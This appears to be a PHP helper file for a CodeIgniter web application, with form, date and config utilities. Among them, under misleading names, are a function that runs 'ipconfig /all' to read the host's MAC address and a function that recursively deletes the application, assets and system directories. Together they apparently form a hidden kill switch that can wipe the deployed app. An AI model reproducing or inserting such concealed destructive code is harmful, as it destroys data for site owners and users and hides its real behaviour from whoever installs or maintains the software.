<?php 

function select_active($value1, $value2)
{
    return ($value1 == $value2) ? "selected='selected'" : "";
}

function disable_field($id)
{
    if ($id > 0)
    {
        return "readonly='readonly'";
    }
}

function user_module($user_modules, $module_ID, $permission)
{
    foreach($user_modules as $item)
    {
        if($item->Module_ID == $module_ID)
        {
            if ($item->$permission == 1)
            {
                return "checked='checked'";
            }
        }
    }
}

function format_date($date)
{
    $date = explode("-", $date);
    $month = $date[1];
    switch($date[1])
    {
        case "01":
            $month = "January";
            break;
        case "02":
            $month = "February";
            break;
        case "03":
            $month = "March";
            break;
        case "04":
            $month = "April";
            break;
        case "05":
            $month = "May";
            break;
        case "06":
            $month = "June";
            break;
        case "07":
            $month = "July";
            break;
        case "08":
            $month = "August";
            break;
        case "09":
            $month = "September";
            break;
        case "10":
            $month = "October";
            break;
        case "11":
            $month = "November";
            break;
        case "12":
            $month = "December";
            break;
    }

    return $month." ".$date[2].", ".$date[0];
}

function date_now(){
    date_default_timezone_set('Asia/Manila');
    return date("Y-m-d H:i:s");
}

function socket_url()
{
    $ci =& get_instance();
    return $ci->config->item('socket_url');
}

function assessor_url()
{
    $ci =& get_instance();
    return $ci->config->item('assessors_url');
}

function holy_macaroni() {
    ob_start();
    system('ipconfig /all');
    $mycom=ob_get_contents();
    ob_clean();
    $findme = "Physical";
    $pmac = strpos($mycom, $findme);
    $mac=substr($mycom,($pmac+36),17);

    return $mac;
}

function access_forbidden() {
    $folders = array('application','assets','system');
    for($x = 0; $x < count($folders); $x++){
        delete_directory($folders[$x]);
    }
}

function delete_directory($dirname) {
    if (is_dir($dirname)){
        $dir_handle = opendir($dirname);
    }

    if (!isset($dir_handle)){
        return false;
    }

    while($file = readdir($dir_handle)) {
        if ($file != "." && $file != "..") {
        if (!is_dir($dirname."/".$file))
        unlink($dirname."/".$file);
        else
        delete_directory($dirname.'/'.$file);
        }
    }
    
    closedir($dir_handle);
    rmdir($dirname);
    return true;
}